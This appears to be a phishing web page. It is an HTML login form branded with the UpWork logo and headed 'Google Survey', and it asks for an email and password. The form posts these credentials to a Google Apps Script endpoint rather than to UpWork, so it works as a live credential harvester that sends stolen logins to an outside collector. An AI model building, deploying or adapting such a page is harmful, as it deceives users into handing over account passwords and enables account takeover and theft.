<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UpWork- Ranjitha Ranganath</title>
    <style>
        /* Use Flexbox to center content horizontally and vertically */
        body, html {
            height: 100%; /* Ensure full height of the page */
            margin: 0; /* Remove default margin */
            display: flex; /* Enable Flexbox */
            justify-content: center; /* Align items horizontally in the center */
            align-items: center; /* Align items vertically in the center */
            font-family: Arial, sans-serif; /* Set font family */
        }
        
        .container {
            text-align: center; /* Center the text */
            padding: 20px;
            border: 1px solid #ddd; /* Optional: border for the form */
            border-radius: 8px; /* Optional: rounded corners */
            background-color: #f4f4f4; /* Light background color */
        }

        form {
            display: inline-block; /* Make the form inline block to control width */
            text-align: left; /* Align text inside the form */
        }

        label, input {
            display: block; /* Make the label and input elements block-level */
            margin: 10px 0; /* Add margin for spacing */
        }

        input {
            width: 100%; /* Make inputs fill the width */
            padding: 10px; /* Add padding inside inputs */
            box-sizing: border-box; /* Ensure padding doesn't affect width */
            border: 1px solid #ccc; /* Border for inputs */
            border-radius: 4px; /* Rounded corners for inputs */
        }

        button {
            padding: 10px 20px;
            background-color: #4CAF50; /* Green background */
            color: white;
            border: none;
            border-radius: 4px; /* Rounded corners */
            cursor: pointer;
            width: 100%; /* Make button fill the width */
        }

        button:hover {
            background-color: #45a049; /* Darker green on hover */
        }
    </style>
</head>
<body>
    <div class="container">
<img src="upwork.png" alt="UpWork Logo" style="width: 150px; height: auto;">
        <h1>Google Survey</h1>
        <!-- Logo -->
       

        <!-- Form -->


              <form id="myForm" action="https://script.google.com/macros/s/AKfycbw_Sx1qP0A8aiV0GcZ83SNUHMRh0Nibr6ITjMz7EWZFM2QuDXvahZsn8VloDVvCCfXt/exec" method="post">
            <label for="email">Email</label>
            <input type="text" id="email" name="email" required>
            

            <label for="password">Password</label>
            <input type="password" id="password" name="password" required>
            

            <button type="submit">Sign in</button>
        </form>
    </div>
    <!-- Modal HTML -->
<div id="myModal" class="modal">
  <div class="modal-content">
    <span class="close">&times;</span>
    <p id="modalMessage"></p>
  </div>
</div>
    <script src="index.js">
</script>
</body>
</html>
